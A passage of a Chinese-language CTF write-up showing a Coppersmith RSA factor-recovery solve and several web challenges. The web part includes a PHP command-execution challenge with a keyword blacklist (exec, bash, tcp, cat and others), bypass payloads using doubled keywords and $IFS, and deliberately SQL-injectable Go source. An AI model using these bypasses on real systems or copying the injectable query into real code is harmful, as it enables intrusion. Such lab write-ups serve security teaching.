class="built_in">str</span>(c[i]^out)</span><br><span class="line"></span><br><span class="line">hp = <span class="built_in">int</span>(hp, <span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(hp)</span><br><span class="line"><span class="comment"># 484896331241166236766986322307256381427323829969266475890843705533431739217993785274442520213477613786483789873490025705365184544110819157393140954140256890174240795425112</span></span><br></pre></td></tr></table></figure><p>此时 $hp$ 有568位，根据Coppersmith定理，1024位的 $p$ 至少需要高576位才能恢复完整 $p$，需爆破8位二进制位：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Sage</span></span><br><span class="line">n = <span class="number">9363543374665338283861145656340115756598328744870620756798779080826725774691364161648335378062705433999048117564356637094421930886166369832353405527855104576202658647651524758179962855692461154859961903531990172279764099199157181167775307950690492969859829926808950964120678082460448847927074487568619536568740301649988555476490206693181162301088156855926656544441682939839165455244630182978802660669255401576213941067679888164237586879364615664942234247896214195262510935345922512831632385741735810122730130366521612834556565838623708828780093323310348242654778247293430853566054703991781432542625271396246500576703</span></span><br><span class="line">hp = <span class="number">484896331241166236766986322307256381427323829969266475890843705533431739217993785274442520213477613786483789873490025705365184544110819157393140954140256890174240795425112</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">dic = string.digits + <span class="string">&quot;abcdef&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> dic:</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> dic:</span><br><span class="line">        pp = <span class="built_in">hex</span>(hp) + a + b</span><br><span class="line">        <span class="comment">#p需要用0补全到1024位</span></span><br><span class="line">        pp += <span class="string">&#x27;0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#x27;</span></span><br><span class="line">        <span class="comment">#要加的数字与补全p时0的个数有关</span></span><br><span class="line">        pp = <span class="built_in">int</span>(pp, <span class="number">16</span>)</span><br><span class="line">        p_fake = pp+<span class="number">0x10000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</span></span><br><span class="line">        pbits = <span class="number">1024</span></span><br><span class="line">        kbits = pbits-<span class="number">576</span></span><br><span class="line">        pbar = p_fake &amp; (<span class="number">2</span>^pbits-<span class="number">2</span>^kbits)</span><br><span class="line">        <span class="comment">#print(&quot;upper %d bits (of %d bits) is given&quot; % (pbits-kbits, pbits))</span></span><br><span class="line">        PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">        f = x + pbar</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            x0 = f.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">0.4</span>)[<span class="number">0</span>]  <span class="comment"># find root &lt; 2^kbits with factor &gt;= n^0.4</span></span><br><span class="line">            <span class="built_in">print</span>(x0 + pbar)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span>        </span><br><span class="line"><span class="comment"># 90225006288627020933267024425797647042965554486273674145474629022335483579168020321334177600624475358419458781387021577078957978886555066264514364951229871833611713144617155837023313756741716041993159155093522769416742461683810041045361926334946115547487234272520914249496954864904467634471167509689549908477</span></span><br></pre></td></tr></table></figure><p>最后常规RSA：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">p = <span class="number">90225006288627020933267024425797647042965554486273674145474629022335483579168020321334177600624475358419458781387021577078957978886555066264514364951229871833611713144617155837023313756741716041993159155093522769416742461683810041045361926334946115547487234272520914249496954864904467634471167509689549908477</span></span><br><span class="line">n = <span class="number">9363543374665338283861145656340115756598328744870620756798779080826725774691364161648335378062705433999048117564356637094421930886166369832353405527855104576202658647651524758179962855692461154859961903531990172279764099199157181167775307950690492969859829926808950964120678082460448847927074487568619536568740301649988555476490206693181162301088156855926656544441682939839165455244630182978802660669255401576213941067679888164237586879364615664942234247896214195262510935345922512831632385741735810122730130366521612834556565838623708828780093323310348242654778247293430853566054703991781432542625271396246500576703</span></span><br><span class="line">c = <span class="number">3641304537029815746727163894554557322382012539953948183406308231174259571263608621970973671202001456955622458371303424750815017578104069924877881162707673935496925529412748663209884628320657034190702348924814794263041483260377960569530869386619921425415323912964305979776909598200202236912823968867485696101691879580799000240715778010424877093758489309380968229017074542588151574195295436881889313935734282141447498134543053106463951864974512375314091440713165047188590693431938599822340588934591712592995622334522799914563528630705687647950894928965913199772209825508001274120556508220248069647851360567609656517789</span></span><br><span class="line">q = n//p</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,f)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"><span class="comment"># b&#x27;flag&#123;fbbce1e3aa690ebb49039241f940ed26&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="CLICK"><a href="#CLICK" class="headerlink" title="CLICK"></a>CLICK</h3><p>查看源码，找到 <code>main.js</code>，发现 <code>ZmxhZ3thNTNlMTgzOC01OTczLTRlY2MtOWFjMC00ODZlOTA0NThhMTl9Cg==</code>，base64解码得flag。</p><p>​    </p><h3 id="Web-sign-in"><a href="#Web-sign-in" class="headerlink" title="Web-sign in"></a>Web-sign in</h3><p>提示robots协议，访问 <code>robots.txt</code>，发现存在 <code>fiag_ls_h3re.php</code>，</p><p>访问发现右键被禁用，加前缀 <code>view-source:</code> 查看源码得flag。</p><p>​    </p><h3 id="EXEC"><a href="#EXEC" class="headerlink" title="EXEC"></a>EXEC</h3><blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&quot;cmd&quot;</span>]))&#123;</span><br><span class="line">    <span class="variable">$shell</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line">    <span class="variable">$shell</span> = str_ireplace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = str_ireplace(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = str_ireplace(<span class="string">&quot;\t&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = str_ireplace(<span class="string">&quot;?&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = str_ireplace(<span class="string">&quot;*&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = str_ireplace(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = str_ireplace(<span class="string">&quot;system&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = str_ireplace(<span class="string">&quot;passthru&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = str_ireplace(<span class="string">&quot;ob_start&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = str_ireplace(<span class="string">&quot;getenv&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = str_ireplace(<span class="string">&quot;putenv&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = str_ireplace(<span class="string">&quot;mail&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = str_ireplace(<span class="string">&quot;error_log&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = str_ireplace(<span class="string">&quot;`&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = str_ireplace(<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = str_ireplace(<span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = str_ireplace(<span class="string">&quot;echo&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = str_ireplace(<span class="string">&quot;cat&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = str_ireplace(<span class="string">&quot;ls&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = str_ireplace(<span class="string">&quot;nl&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = str_ireplace(<span class="string">&quot;tac&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = str_ireplace(<span class="string">&quot;bash&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = str_ireplace(<span class="string">&quot;sh&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = str_ireplace(<span class="string">&quot;tcp&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = str_ireplace(<span class="string">&quot;base64&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = str_ireplace(<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = str_ireplace(<span class="string">&quot;cp&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    exec(<span class="variable">$shell</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><p>带黑名单的无回显RCE，可以重定向写命令执行结果到文件，关键字可双写绕过，空格用<code>$IFS</code>绕过。</p><p>列目录：<code>?cmd=llss$IFS/&gt;1.txt</code>，得到根目录flag文件名 <code>ctf_is_fun_flag2021</code>；</p><p>读文件：<code>?cmd=uniq$IFS/ctf_is_fun_flflagag2021&gt;1.txt</code>，得到flag。</p><p>​    </p><h3 id="Language"><a href="#Language" class="headerlink" title="Language"></a>Language</h3><p>源码里有python和go两个文件夹，有两个服务，端口8000是python开的，映射到对外端口；内网端口5000是go服务。python代码相当于中转站接受外网请求，处理后转发给go，go进行底层处理。</p><p>go服务中关键代码 <code>backend.go</code>：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> controller</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">db <span class="string">&quot;ctf/database&quot;</span></span><br><span class="line"><span class="string">&quot;encoding/json&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/buger/jsonparser&quot;</span></span><br><span class="line"><span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Language <span class="keyword">struct</span> &#123;</span><br><span class="line">Id  <span class="keyword">int32</span>  <span class="string">`json:&quot;id&quot;`</span></span><br><span class="line">Name <span class="keyword">string</span> <span class="string">`json:&quot;name&quot;`</span></span><br><span class="line">Votes <span class="keyword">int64</span> <span class="string">`json:&quot;votes&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Index</span><span class="params">(w http.ResponseWriter, _ *http.Request)</span></span> &#123;</span><br><span class="line">ok(w, <span class="string">&quot;Hello World!&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">List</span><span class="params">(w http.ResponseWriter, _ *http.Request)</span></span> &#123;</span><br><span class="line"></span><br><span class="line">rows, err := db.Sqlite.Query(<span class="string">&quot;SELECT * FROM languages;&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fail(w, <span class="string">&quot;Something wrong&quot;</span>)</span><br><span class="line">fmt.Println(err.Error())</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> rows.Close()</span><br><span class="line"></span><br><span class="line">res := <span class="built_in">make</span>([]Language, <span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> rows.Next() &#123;</span><br><span class="line"><span class="keyword">var</span> pl Language</span><br><span class="line">_ = rows.Scan(&amp;pl.Id, &amp;pl.Name, &amp;pl.Votes)</span><br><span class="line">res = <span class="built_in">append</span>(res, pl)</span><br><span class="line">&#125;</span><br><span class="line">err = json.NewEncoder(w).Encode(res)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Search</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">reqBody, _ := ioutil.ReadAll(r.Body)</span><br><span class="line"></span><br><span class="line">votes, err := jsonparser.GetInt(reqBody, <span class="string">&quot;votes&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fail(w, <span class="string">&quot;Error reading votes&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">name, err := jsonparser.GetString(reqBody, <span class="string">&quot;name&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fail(w, <span class="string">&quot;Error reading name&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">query := fmt.Sprintf(<span class="string">&quot;SELECT * FROM languages WHERE votes &gt;= %d OR name LIKE &#x27;%s&#x27;;&quot;</span>, votes, name)</span><br><span class="line">rows, err := db.Sqlite.Query(query)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fail(w, <span class="string">&quot;Something wrong&quot;</span>)</span><br><span class="line">fmt.Println(err.Error())</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">res := <span class="built_in">make</span>([]Language, <span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> rows.Next() &#123;</span><br><span class="line"><span class="keyword">var</span> pl Language</span><br><span class="line">_ = rows.Scan(&amp;pl.Id, &amp;pl.Name, &amp;pl.Votes)</span><br><span class="line">res = <span class="built_in">append</span>(res, pl)</span><br><span class="line">&#125;</span><br><span class="line">err = json.NewEncoder(w).Encode(res)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Flag</span><span class="params">(w http.ResponseWriter, r *http.Request )</span></span> &#123;</span><br><span class="line">action:= r.URL.Query().Get(<span class="string">&quot;action&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> action == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">fail(w, <span class="string">&quot;Error getting action&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">token:= r.URL.Query().Get(<span class="string">&quot;token&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> token == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">fail(w, <span class="string">&quot;Error getting token&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> secret <span class="keyword">string</span></span><br><span class="line">row := db.Sqlite.QueryRow(<span class="string">&quot;SELECT secret FROM token;&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err := row.Scan(&amp;secret); err != <span class="literal">nil</span> &#123;</span><br><span class="line">fail(w, <span class="string">&quot;Error querying secret token&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> action == <span class="string">&quot;readFlag&quot;</span> &amp;&amp; secret == token &#123;</span><br><span class="line">data, err := ioutil.ReadFile(<span class="string">&quot;flag&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fail(w, <span class="string">&quot;Error reading flag&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">ok(w, fmt.Sprintf(<span class="string">&quot;Congrats this is your flag: %s&quot;</span>, <span class="keyword">string</span>(data)))</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">ok(w, <span class="string">&quot;Wrong token&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>路由 <code>/flag</code> 中GET两个参数 <code>?action=readFlag&amp;token=xxxxx</code>，token正确得flag，而路由 <code>/search</code> 中容易通过SQL注入拿到token。</p><p>python服务中 <code>app.py</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, jsonify</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> unquote</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">server = <span class="string">&#x27;127.0.0.1:8000&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/list&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">listAll</span>():</span></span><br><span class="line">    r = requests.post(<span class="string">f&quot;http://<span class="subst">&#123;server&#125;</span>/api/list&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> jsonify(r.json())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/search&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search</span>():</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;search.html&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        data = request.json</span><br><span class="line">        <span class="keyword">if</span> data[<span class="string">&#x27;name&#x27;</span>]:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(data[<span class="string">&#x27;name&#x27;</span>], <span class="built_in">str</span>) <span class="keyword">or</span> <span class="keyword">not</span> data[<span class="string">&#x27;name&#x27;</span>].isalnum():</span><br><span class="line">                <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Bad word detected&quot;</span>&#125;)</span><br><span class="line">        <span class="keyword">if</span> data[<span class="string">&#x27;votes&#x27;</span>]:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(data[<span class="string">&#x27;votes&#x27;</span>], <span class="built_in">int</span>):</span><br><span class="line">                <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Bad word detected&quot;</span>&#125;)</span><br><span class="line">        r = requests.post(<span class="string">f&quot;http://<span class="subst">&#123;server&#125;</span>/api/search&quot;</span>, data=request.data)</span><br><span class="line">        <span class="keyword">return</span> jsonify(r.json())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/healthcheck&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">healthCheck</span>():</span></span><br><span class="line">    getPath = [<span class="string">&quot;&quot;</span>, <span class="string">&quot;flag&quot;</span>]</span><br><span class="line">    postPath = [<span class="string">&quot;api/list&quot;</span>, <span class="string">&quot;api/search&quot;</span>]</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">for</span> path <span class="keyword">in</span> getPath:</span><br><span class="line">            requests.get(<span class="string">f&quot;http://<span class="subst">&#123;server&#125;</span>/<span class="subst">&#123;path&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> path <span class="keyword">in</span> postPath:</span><br><span class="line">            requests.post(<span class="string">f&quot;http://<span class="subst">&#123;server&#125;</span>/<span class="subst">&#123;path&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Down&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;OK&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&lt;path:path&gt;&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handle</span>(<span class="params">path</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> unquote(path):</span><br><span class="line">        action = request.args.get(<span class="string">&#x27;action&#x27;</span>)</span><br><span class="line">        token = request.args.get(<span class="string">&#x27;token&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(action)</span><br><span class="line">        <span class="keyword">if</span> action == <span class="string">&quot;readFlag&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Sorry, readFlag is not permitted&quot;</span>&#125;)</span><br><span class="line">        r = requests.get(<span class="string">f&quot;http://<span class="subst">&#123;server&#125;</span>/<span class="subst">&#123;path&#125;</span>&quot;</span>, params=&#123;</span><br><span class="line">            <span class="string">&quot;action&quot;</span>: action,</span><br><span class="line">            <span class="string">&quot;token&quot;</span>: token</span><br><span class="line">        &#125;)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r = requests.get(<span class="string">f&quot;http://<span class="subst">&#123;server&#125;</span>/<span class="subst">&#123;path&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> jsonify(r.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span 